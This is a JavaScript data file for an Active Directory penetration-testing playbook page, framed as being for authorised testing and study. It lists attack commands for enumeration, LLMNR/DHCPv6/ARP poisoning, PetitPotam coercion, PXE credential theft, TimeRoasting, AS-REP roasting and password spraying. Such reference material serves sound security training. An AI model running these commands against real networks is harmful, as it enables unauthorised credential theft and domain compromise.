/*
  AD ATTACK PATH v2 — data for ad-map-v2.html

  A guided "playbook": colour-coded ACCESS SECTIONS you expand, each holding
  TECHNIQUE buttons you expand, each showing a Theory/CVE link, a short note,
  the commands, colour-coded OUTCOME badges, and "move to" pivots that jump to
  another (differently-coloured) section when your access changes.

  MODEL
    meta       title / version / note
    palette    named outcome colours (kept here so the scheme is consistent)
    sections[] {
      id, title, color(hex), tag, desc,
      techniques[] {
        id, title,
        theory : { label, url } | null,
        cve    : { id, label?, url? } | null,   // rendered as a CVE banner + chip
        desc   : "short note" | null,
        cmds   : [ "command", ... ],            // # comments are dimmed
        branches[] : {                          // optional nested sub-paths
          label, warn?(bool), cmds[], outcomes[]
        },
        outcomes[] : { label, color(hex) },     // colour-coded result badges
        moveTo[]   : { section, label?, note? }  // pivots to another section
      }
    }

  Extend the sections below — the page rebuilds itself automatically.
*/

var AD_MAP_V2 = {
  meta: {
    title: "AD Attack Path — Guided Playbook",
    version: "v2",
    note: "For authorised testing and study only. Click a section to expand it, then a technique for its commands."
  },

  // shared outcome palette (matches the section colours + result-box scheme)
  palette: {
    lavender:   "#cdc7e6",  // No Credentials
    blue:       "#3b9ee5",  // Valid user (Username)
    greenPale:  "#86efac",  // vulnerable host
    green:      "#4ade80",  // credentials obtained
    yellow:     "#ffe14a",  // poisoning / coerce
    orange:     "#e8912e"   // crackable hash
  },

  sections: [
    {
      id: "no-creds",
      title: "No Credentials",
      color: "#cdc7e6",
      tag: "Start here",
      desc: "You're on the network with no domain account yet — scan, find the domain, and hunt a first credential or hash.",
      techniques: [
        {
          id: "scan-network",
          title: "Scan network",
          theory: { label: "AD Fundamentals", url: "theory/2026-08-18-ad-fundamentals.html" },
          cve: null,
          desc: "Sweep the subnet and fingerprint hosts/services to find domain controllers and vulnerable targets.",
          cmds: [
            "nxc smb <ip_range>",
            "nmap -sP -p <ip>",
            "nmap -Pn -sV --top-ports 50 --open <ip>",
            "nmap -Pn --script smb-vuln* -p139,445 <ip>",
            "nmap -Pn -sC -sV -oA <output> <ip>",
            "nmap -Pn -sC -sV -p- -oA <output> <ip>",
            "nmap -sU -sC -sV -oA <output> <ip>"
          ],
          outcomes: [{ label: "Vulnerable host", color: "#86efac" }],
          moveTo: []
        },
        {
          id: "find-dc-ip",
          title: "Find DC IP",
          theory: { label: "AD Fundamentals", url: "theory/2026-08-18-ad-fundamentals.html" },
          cve: null,
          desc: "Identify the domain controllers via the local interface, DNS SRV records, and the Kerberos port.",
          cmds: [
            "nmcli dev show <interface>",
            "nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>",
            "nmap -p 88 --open <ip_range>"
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "zone-transfer",
          title: "Zone transfer",
          theory: { label: "AD Fundamentals", url: "theory/2026-08-18-ad-fundamentals.html" },
          cve: null,
          desc: "Attempt an AXFR to pull the whole DNS zone and map internal hostnames.",
          cmds: [
            "dig axfr <domain_name> @<name_server>"
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "anon-guest-smb",
          title: "Anonymous & Guest access on SMB shares",
          theory: { label: "LDAP and the AD Database", url: "theory/2026-08-18-ldap.html" },
          cve: null,
          desc: "Null and guest sessions can leak users, shares and policy with no credentials.",
          cmds: [
            "nxc smb <ip_range> -u '' -p ''",
            "nxc smb <ip_range> -u 'a' -p ''",
            "enum4linux-ng.py -a -u '' -p '' <ip>",
            "smbclient -U '%' -L //<ip>"
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "enum-ldap",
          title: "Enumerate LDAP",
          theory: { label: "LDAP and the AD Database", url: "theory/2026-08-18-ldap.html" },
          cve: null,
          desc: "Probe LDAP for anonymous binds and directory data.",
          cmds: [
            "nmap -n -sV --script 'ldap* and not brute' -p 389 <dc_ip>",
            "ldapsearch -x -H <dc_ip> -s base"
          ],
          outcomes: [],
          moveTo: [{ section: "valid-user", label: "Username", note: "once enumeration yields a usable account" }]
        },
        {
          id: "enum-users",
          title: "Enumerate Users",
          theory: { label: "LDAP and the AD Database", url: "theory/2026-08-18-ldap.html" },
          cve: null,
          desc: "RID-cycle and RPC-enumerate to build a username list.",
          cmds: [
            "nxc smb <dc_ip> --rid-brute 10000   # bruteforcing RID",
            "net rpc group members 'Domain Users' -W '<domain>' -l <ip> -U '%'"
          ],
          outcomes: [],
          moveTo: [{ section: "valid-user", label: "Username", note: "a valid username list feeds spraying / roasting" }]
        },
        {
          id: "bruteforce-users",
          title: "Bruteforce users",
          theory: { label: "Kerberos Authentication", url: "theory/2026-08-18-kerberos.html" },
          cve: null,
          desc: "Confirm which usernames exist via Kerberos pre-auth — no logon failure generated.",
          cmds: [
            "kerbrute userenum -d <domain> <userlist>",
            "nmap -p 88 --script=krb5-enum-users --script-args=\"krb5-enum-users.realm='<domain>',userdb=<user_list_file>\" <dc_ip>"
          ],
          outcomes: [],
          moveTo: [{ section: "valid-user", label: "Username", note: "confirmed usernames feed spraying / roasting" }]
        },
        {
          id: "poisoning",
          title: "Poisoning",
          theory: { label: "Coercion & NTLM Relay", url: "theory/2026-08-18-coercion-ntlm-relay.html" },
          cve: null,
          desc: "Answer broadcast name-resolution or MITM the segment to capture / relay authentication.",
          cmds: [],
          branches: [
            { label: "LLMNR / NBT-NS / mDNS", cmds: ["responder -I <interface>"] },
            { label: "DHCPv6 (IPv6 preferred to IPv4)", warn: true, cmds: ["mitm6 -d <domain>", "bettercap"] },
            { label: "ARP Poisoning", warn: true, cmds: ["bettercap"] },
            { label: "AS-REQ roast (via poisoning)", cmds: ["Pcredz -i <interface> -v"], outcomes: [{ label: "Hash found ASREQ", color: "#e8912e" }] }
          ],
          outcomes: [
            { label: "poisoning SMB", color: "#ffe14a" },
            { label: "poisoning LDAP", color: "#ffe14a" },
            { label: "poisoning HTTP", color: "#ffe14a" }
          ],
          moveTo: []
        },
        {
          id: "coerce",
          title: "Coerce",
          theory: { label: "Coercion & NTLM Relay", url: "theory/2026-08-18-coercion-ntlm-relay.html" },
          cve: { id: "CVE-2022-26925", label: "Unauthenticated PetitPotam", url: "https://nvd.nist.gov/vuln/detail/CVE-2022-26925" },
          desc: "Force a host (often a DC) to authenticate to your listener so it can be relayed.",
          cmds: [
            "petitpotam.py -d <domain> <listener> <target>"
          ],
          outcomes: [{ label: "Coerce SMB", color: "#ffe14a" }],
          moveTo: []
        },
        {
          id: "pxe",
          title: "PXE",
          theory: { label: "SCCM / MECM Abuse", url: "theory/2026-09-24-sccm-mecm-abuse.html" },
          cve: null,
          desc: "Pull SCCM PXE boot media to recover deployment credentials — no domain account needed.",
          cmds: [],
          branches: [
            { label: "no password", cmds: ["pxethief.py 1", "pxethief.py 2 <distribution_point_ip>"], outcomes: [{ label: "Credentials (NAA account)", color: "#4ade80" }] },
            { label: "password protected", cmds: ["tftp -i <dp_ip> GET \"\\xxx\\boot.var\"", "pxethief.py 5 \"\\xxx\\boot.var\""], outcomes: [{ label: "PXE Hash", color: "#e8912e" }] }
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "timeroasting",
          title: "TimeRoasting",
          theory: { label: "Kerberos Authentication", url: "theory/2026-08-18-kerberos.html" },
          cve: null,
          desc: "Abuse MS-SNTP to recover computer-account hashes with no authentication, to crack offline.",
          cmds: [
            "timeroast.py <dc_ip> -o <output_log>"
          ],
          outcomes: [{ label: "timeroast hash", color: "#e8912e" }],
          moveTo: []
        }
      ]
    },

    {
      id: "valid-user",
      title: "Valid User",
      color: "#3b9ee5",
      tag: "Have a credential",
      desc: "You hold at least one valid domain credential (or a crackable hash) — roast, spray and enumerate deeper.",
      techniques: [
        {
          id: "asreproast",
          title: "AS-REP Roasting",
          theory: { label: "AS-REP Roasting", url: "theory/2026-08-18-asrep-roasting.html" },
          cve: null,
          desc: "Accounts with Kerberos pre-auth disabled hand you a crackable AS-REP.",
          cmds: [
            "GetNPUsers.py <domain>/<user>:'<pass>' -request -format hashcat",
            "hashcat -m 18200 asrep.txt wordlist.txt"
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "pw-spray",
          title: "Password spraying",
          theory: { label: "Kerberos Authentication", url: "theory/2026-08-18-kerberos.html" },
          cve: null,
          desc: "Spray one common password across the user list (respect lockout) to land accounts.",
          cmds: [
            "kerbrute passwordspray -d <domain> --dc <dc_ip> users.txt '<Season2026!>'"
          ],
          outcomes: [],
          moveTo: []
        }
      ]
    }
  ]
};
